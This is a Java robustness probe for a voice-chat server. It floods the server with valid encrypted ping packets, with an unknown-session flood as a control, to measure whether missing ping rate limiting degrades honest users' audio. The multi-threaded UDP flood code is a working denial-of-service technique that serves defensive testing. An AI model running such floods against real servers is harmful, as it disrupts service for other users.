package com.enn3developer.gtnhvoice.robustness;

import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

import com.enn3developer.gtnhvoice.core.proto.packets.Packet;
import com.enn3developer.gtnhvoice.core.proto.packets.udp.clientbound.SourceAudioPacket;

/**
 * Lead under test: PingPacket bypasses the per-session audio rate limiter. {@code
 * VoiceServerManager.onPacket} decrypts (AES-GCM) + calls {@code touch()} for EVERY datagram before
 * dispatch, and only PlayerAudioPacket hits {@code audioRateLimiter}; Ping has no cap. Question: can a
 * Ping flood drive enough decrypt+touch work on the single UDP NIO event-loop thread to measurably
 * degrade voice for an honest user?
 *
 * <p>This probe measures REAL impact and separates the two candidate causes with a built-in control:
 * <ul>
 *   <li><b>honest speaker + honest listener</b> at spawn: the speaker sends a genuine 50 frames/s
 *       (20ms cadence, real seq numbers); the listener counts relayed {@code SourceAudioPacket}s and
 *       records arrival gaps. Loss = (expected - received)/expected over each phase window.</li>
 *   <li><b>VALID ping flood</b>: a pre-encoded, correctly-encrypted PingPacket blasted at line rate.
 *       Server path: session lookup -> AES-GCM decrypt -> touch(). This is the attack.</li>
 *   <li><b>UNKNOWN-session control</b>: the same datagram with a random sessionId, blasted at the
 *       same line rate. Server path: session lookup -> {@code session == null} -> return, BEFORE any
 *       decrypt. Same packet rate / same loopback+kernel pressure, but zero server decrypt work.</li>
 * </ul>
 * If the honest listener's loss under the VALID flood is not materially worse than under the
 * UNKNOWN-session flood at the same rate, the degradation (if any) is transport-layer packet-rate /
 * loopback saturation, NOT the missing Ping decrypt cap -> the lead is disproved. If VALID degrades
 * markedly more, the decrypt+touch cost is the culprit.
 */
public final class PingFloodProbe {

    private static final int AUDIO_PAYLOAD = 960;
    private static final int SPEAKER_RATE = 50; // frames/s, a real 20ms-cadence speaker

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        int phaseSeconds = args.length > 2 ? Integer.parseInt(args[2]) : 8;
        int floodThreads = args.length > 3 ? Integer.parseInt(args[3]) : 4;
        // Optional paced flood rate (pkts/s) per the whole flood; <=0 means unpaced (max line rate).
        int pacedRate = args.length > 4 ? Integer.parseInt(args[4]) : 0;

        CountDownLatch victimReady = new CountDownLatch(1);
        AtomicBoolean stop = new AtomicBoolean(false);

        // Phase boundaries (nanoTime), filled in by the main thread; listener buckets by these.
        AtomicLong baseStart = new AtomicLong();
        AtomicLong baseEnd = new AtomicLong();
        AtomicLong validStart = new AtomicLong();
        AtomicLong validEnd = new AtomicLong();
        AtomicLong unknownStart = new AtomicLong();
        AtomicLong unknownEnd = new AtomicLong();

        AtomicLong baseFrames = new AtomicLong();
        AtomicLong validFrames = new AtomicLong();
        AtomicLong unknownFrames = new AtomicLong();
        AtomicLong maxGapBaseNs = new AtomicLong();
        AtomicLong maxGapValidNs = new AtomicLong();
        AtomicLong maxGapUnknownNs = new AtomicLong();

        // ---- honest listener ----
        Thread listener = new Thread(() -> {
            try (VoiceSession victim = Client.connect(host, port)
                .username("listenerbot")
                .establish()) {
                victim.enlargeReceiveBuffer(8 * 1024 * 1024);
                victim.ping().ping().ping();
                System.out.println("[probe] listener up: sessionId=" + victim.getSessionId());
                victimReady.countDown();

                long lastArrival = 0;
                while (!stop.get()) {
                    byte[] frame = victim.receiveUdp(200);
                    if (frame == null) continue;
                    Packet<?> packet = victim.decode(frame);
                    if (!(packet instanceof SourceAudioPacket)) continue;
                    long now = System.nanoTime();
                    long gap = lastArrival == 0 ? 0 : now - lastArrival;
                    lastArrival = now;
                    bump(now, gap, baseStart, baseEnd, baseFrames, maxGapBaseNs);
                    bump(now, gap, validStart, validEnd, validFrames, maxGapValidNs);
                    bump(now, gap, unknownStart, unknownEnd, unknownFrames, maxGapUnknownNs);
                }
            } catch (Exception e) {
                System.out.println("[probe] listener error: " + e);
                victimReady.countDown();
            }
        }, "listener");
        listener.start();
        victimReady.await();

        try (VoiceSession speaker = Client.connect(host, port)
            .username("speakerbot")
            .establish();
            VoiceSession mallory = Client.connect(host, port)
                .username("mallorybot")
                .establish()) {

            speaker.ping().ping();
            mallory.ping().ping();
            System.out.println("[probe] speaker up: " + speaker.getSessionId());
            System.out.println("[probe] mallory up: " + mallory.getSessionId());

            // ---- honest speaker: genuine 50 fps for the whole run ----
            AtomicLong seq = new AtomicLong();
            byte[] audio = new byte[AUDIO_PAYLOAD];
            java.util.Arrays.fill(audio, (byte) 0x5a);
            UUID activationId = UUID.randomUUID();
            Thread speakerThread = new Thread(() -> {
                long start = System.nanoTime();
                long nanosPer = 1_000_000_000L / SPEAKER_RATE;
                long n = 0;
                while (!stop.get()) {
                    long s = seq.getAndIncrement();
                    speaker.sendUdp(speaker.encodePlayerAudio(s, audio, activationId, (short) 0, false));
                    n++;
                    long due = start + n * nanosPer;
                    while (System.nanoTime() < due && !stop.get()) { /* pace */ }
                }
            }, "speaker");
            speakerThread.start();

            // ---- pre-encoded flood frames ----
            byte[] validPing = mallory.encodePing();                 // full valid, server decrypts
            byte[] unknownPing = withRandomSessionId(validPing);     // dropped pre-decrypt

            long pw = phaseSeconds * 1_000_000_000L;

            // Phase 1: baseline (no flood)
            System.out.println("[probe] === phase BASELINE (" + phaseSeconds + "s, no flood) ===");
            baseStart.set(System.nanoTime());
            sleepNanos(pw, stop);
            baseEnd.set(System.nanoTime());

            // Phase 2: VALID ping flood
            System.out.println("[probe] === phase VALID ping flood (" + phaseSeconds + "s) ===");
            long validSent = runFlood(mallory, validPing, floodThreads, pacedRate, phaseSeconds, validStart, validEnd,
                stop);

            // small settle so the two floods don't overlap in the listener's buckets
            sleepNanos(500_000_000L, stop);

            // Phase 3: UNKNOWN-session flood (control)
            System.out.println("[probe] === phase UNKNOWN-session flood control (" + phaseSeconds + "s) ===");
            long unknownSent = runFlood(mallory, unknownPing, floodThreads, pacedRate, phaseSeconds, unknownStart,
                unknownEnd, stop);

            sleepNanos(1_000_000_000L, stop);
            stop.set(true);
            speakerThread.join(3000);

            report("BASELINE      ", phaseSeconds, baseFrames.get(), maxGapBaseNs.get(), 0);
            report("VALID  flood  ", phaseSeconds, validFrames.get(), maxGapValidNs.get(), validSent);
            report("UNKNOWN flood ", phaseSeconds, unknownFrames.get(), maxGapUnknownNs.get(), unknownSent);
        } finally {
            stop.set(true);
            listener.join(4000);
        }
    }

    private static long runFlood(VoiceSession mallory, byte[] frame, int threads, int pacedRate, int seconds,
        AtomicLong startOut, AtomicLong endOut, AtomicBoolean stop) throws InterruptedException {
        AtomicLong sent = new AtomicLong();
        AtomicBoolean floodStop = new AtomicBoolean(false);
        long deadline = System.nanoTime() + seconds * 1_000_000_000L;
        startOut.set(System.nanoTime());

        Thread[] ts = new Thread[threads];
        long nanosPerPkt = pacedRate > 0 ? 1_000_000_000L / pacedRate * threads : 0;
        for (int i = 0; i < threads; i++) {
            ts[i] = new Thread(() -> {
                long start = System.nanoTime();
                long local = 0;
                while (System.nanoTime() < deadline && !stop.get() && !floodStop.get()) {
                    mallory.sendUdp(frame);
                    sent.incrementAndGet();
                    local++;
                    if (nanosPerPkt > 0) {
                        long due = start + local * nanosPerPkt;
                        while (System.nanoTime() < due) { /* pace */ }
                    }
                }
            }, "flood-" + i);
            ts[i].start();
        }
        for (Thread t : ts) t.join();
        endOut.set(System.nanoTime());
        long total = sent.get();
        System.out.printf("[probe]   flood sent %d datagrams in %ds = %.0f pkts/s%n", total, seconds,
            total / (double) seconds);
        return total;
    }

    private static void bump(long now, long gap, AtomicLong start, AtomicLong end, AtomicLong frames,
        AtomicLong maxGap) {
        long s = start.get();
        long e = end.get();
        if (s == 0 || now < s) return;
        if (e != 0 && now > e) return;
        frames.incrementAndGet();
        if (gap > maxGap.get()) maxGap.set(gap);
    }

    private static byte[] withRandomSessionId(byte[] validFrame) {
        byte[] copy = validFrame.clone();
        // layout: magic(4) + type(2) + sessionId(16) + ...  -> sessionId at offset 6
        UUID rnd = UUID.randomUUID();
        writeLong(copy, 6, rnd.getMostSignificantBits());
        writeLong(copy, 14, rnd.getLeastSignificantBits());
        return copy;
    }

    private static void writeLong(byte[] b, int off, long v) {
        for (int i = 0; i < 8; i++) b[off + i] = (byte) (v >>> (56 - 8 * i));
    }

    private static void sleepNanos(long ns, AtomicBoolean stop) {
        long due = System.nanoTime() + ns;
        while (System.nanoTime() < due && !stop.get()) {
            try {
                Thread.sleep(20);
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    private static void report(String label, int seconds, long frames, long maxGapNs, long floodSent) {
        int expected = SPEAKER_RATE * seconds;
        double lossPct = 100.0 * (expected - frames) / expected;
        System.out.printf(
            "[RESULT] %s expected=%d received=%d loss=%.1f%% maxGap=%.1fms%s%n",
            label, expected, frames, lossPct, maxGapNs / 1e6,
            floodSent > 0 ? String.format("  floodRate=%.0f pkts/s", floodSent / (double) seconds) : "");
    }

    private PingFloodProbe() {}
}
